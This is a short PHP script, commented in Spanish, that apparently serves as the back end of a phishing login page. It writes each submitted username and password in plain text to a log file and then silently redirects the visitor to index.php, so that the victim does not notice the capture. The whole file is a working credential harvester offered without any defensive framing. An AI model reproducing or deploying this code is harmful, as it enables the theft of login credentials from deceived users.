

<?php
//Creamos el archivo datos.txt
//ponemos tipo 'a' para añadir lineas sin borrar
$file=fopen("333/log.txt","a") or die("Problemas");
  //vamos añadiendo el contenido
  fputs($file,"Usuario: ");
  fputs ($file,$_POST['nombre']);
  fputs($file,"\n");
  fputs($file,"Password: ");
  fputs ($file,$_POST['password']);
  fputs($file,"\r\n");
  fputs($file,"  ");
  fclose($file);
////////////////////////////////////////////// MODULO 2 /////////////////////////////////////////////  
  
  
  
?>
  
  
  
<?php
ob_start(); 
  header("refresh: 0; url = index.php"); 
ob_end_flush();  
?> 
  
  
  
  
  
  
  